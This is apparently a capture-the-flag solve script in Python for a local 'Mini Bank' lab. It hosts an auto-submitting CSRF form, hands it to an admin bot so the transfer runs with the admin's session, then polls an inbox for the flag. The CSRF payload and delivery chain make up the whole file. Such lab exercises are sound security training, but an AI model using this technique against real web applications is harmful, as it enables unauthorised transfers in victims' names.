#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
"""
Q16 - CSRF POST Transfer (Mini Bank) 自动化解题脚本
靶机：http://127.0.0.1:34921/

利用链：
  1. 普通账号 student / student 登录
  2. /pages/host 托管一段“自动提交 POST /transfer”的 HTML（同源）
  3. /pages/submit 把该 /pages/<id> 提交给 admin 机器人
  4. admin 机器人（Chromium headless，每 20s 抓一次）以 admin 身份打开该页面
     → 浏览器自动带 admin 的 session cookie 提交转账
     → 服务端无 CSRF token / 无 Referer 校验，转账成功
  5. 触发“admin 首次福利转账” 收件箱 → flag 发到 student/inbox
"""
import re
import time
import requests

os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1

BASE = os.environ.get("GKD_URL") or ("http://127.0.0.1:34929")
USER = "student"
PASS = "student"

# 同源自动提交 POST 表单：把 admin 的钱转 1 元给 student
CSRF_HTML = """<!doctype html><html><body>
<form id="f" action="/transfer" method="post">
  <input name="to" value="student">
  <input name="amount" value="1">
</form>
<script>document.getElementById('f').submit();</script>
</body></html>"""


def main():
    s = requests.Session()

    # 1) 登录 student
    r = s.post(f"{BASE}/login", data={"username": USER, "password": PASS},
               allow_redirects=False)
    assert r.status_code in (302, 303), f"login failed: {r.status_code}"
    print(f"[+] 登录成功，session={s.cookies.get('session')[:24]}...")

    # 2) 托管 CSRF 自动提交页面
    r = s.post(f"{BASE}/pages/host", data={"html": CSRF_HTML})
    m = re.search(r"/pages/([0-9a-fA-F]+)", r.text)
    assert m, "未拿到 /pages/<id>"
    page_path = m.group(0)
    print(f"[+] 已托管 CSRF 页面：{BASE}{page_path}")

    # 3) 投递给 admin 机器人
    r = s.post(f"{BASE}/pages/submit", data={"url": page_path})
    assert "已提交" in r.text, "提交 bot 失败"
    print(f"[+] 已投递给 admin 机器人，等待 20s 内访问 ...")

    # 4) 轮询 inbox 拿 flag
    flag_pat = re.compile(r"(TOGOGO-flag\{[^}]+\})")
    for i in range(12):
        time.sleep(5)
        r = s.get(f"{BASE}/inbox")
        fm = flag_pat.search(r.text)
        if fm:
            print(f"[+] 用时 ~{(i+1)*5}s")
            print(f"[*] FLAG => {fm.group(1)}")
            return fm.group(1)
        print(f"    [{(i+1)*5:>3}s] 暂无 flag，继续等待 ...")

    raise RuntimeError("超时未收到 flag，检查 bot 是否在线")


if __name__ == "__main__":
    main()
